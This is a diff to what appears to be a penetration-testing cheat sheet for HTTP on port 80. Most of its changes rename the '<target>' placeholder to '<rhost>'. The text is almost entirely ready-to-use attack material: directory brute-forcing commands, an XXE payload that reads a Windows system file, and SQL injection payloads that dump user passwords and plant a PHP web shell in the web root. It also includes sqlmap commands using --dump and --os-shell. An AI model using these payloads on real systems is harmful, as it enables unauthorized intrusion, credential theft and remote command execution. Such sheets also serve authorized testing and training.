@@ -1,7 +1,7 @@
 # 80 - HTTP
 
-```text
-gobuster dir -u <target> -w <wordlist> -t 50
+```
+gobuster dir -u <rhost> -w <wordlist> -t 50 -x php,txt
 # also bruteforce extensions (php, txt, ...)
 ```
 
@@ -27,8 +27,8 @@ sitemap.xml
 ## Nobrain tools
 
 ```text
-nikto -host=http://<target>
-dirb -r http://<target>
+nikto -host=http://<rhost>
+dirb -r http://<rhost>
 ```
 
 ## PHP wrappers
@@ -53,7 +53,8 @@ c:\Users\<username>\.ssh\id_rsa
 ## XXE
 
 ```text
-<?xml version="1.0"?>
+
+<?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY yz SYSTEM 'file:///c:/windows/win.ini'>]>
 <order>
     <quantity>3</quantity>
@@ -86,13 +87,13 @@ index.php?id=1 union all select 1, 2, column_name from information_achema.column
 index.php?id=1 union all select 1, username, password from users
 index.php?id=1 union all select 1, 2, load_file('C:\boot.ini')
 index.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'C:\xampp\htdocs\yz.php'
-sqlmap -u http://<target>/index.php?id=1 -p "id"
-sqlmap -u http://<target>/index.php?id=1 -p "id" --dbms=mysql --dump
-sqlmap -u http://<target>/index.php?id=1 -p "id" --dbms=mysql --os-shell
+sqlmap -u http://<rhost>/index.php?id=1 -p "id"
+sqlmap -u http://<rhost>/index.php?id=1 -p "id" --dbms=mysql --dump
+sqlmap -u http://<rhost>/index.php?id=1 -p "id" --dbms=mysql --os-shell
 ```
 
 ```text
-sqlmap -u 'http://<target>/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" [--os-shell]
+sqlmap -u 'http://<rhost>/dashboard.php?search=a' --cookie="PHPSESSID=73jv7pdmjsv7dsspoqtnlv66ls" [--os-shell]
 ```
 
 ### Default languages
